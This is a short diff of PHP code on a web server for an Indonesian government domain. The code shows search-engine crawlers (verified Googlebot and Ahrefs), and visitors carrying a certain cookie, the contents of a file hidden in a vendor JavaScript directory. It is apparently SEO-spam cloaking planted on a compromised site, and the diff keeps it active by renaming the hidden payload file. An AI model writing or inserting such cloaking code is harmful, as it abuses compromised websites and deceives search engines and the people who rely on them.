@@ -5,7 +5,7 @@ $ip = isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]
 $host = gethostbyaddr($ip);
 $isGooglebot = stripos($a, 'googlebot') !== false && preg_match('/\.google(bot)?\.com$/', $host) && gethostbyname($host) === $ip;
 if ($_SERVER['REQUEST_URI'] === '/' && (isset($_COOKIE[0]) || $isGooglebot || (preg_match('/ahref/', $a)))) {
-    echo @file_get_contents('/www/wwwroot/dki2023.kemenag.go.id/public/ppidv1/vendor/tabler/js/123sd');
+    echo @file_get_contents('/www/wwwroot/dki2023.kemenag.go.id/public/ppidv1/vendor/tabler/js/x.txt');
     exit;
 }
 
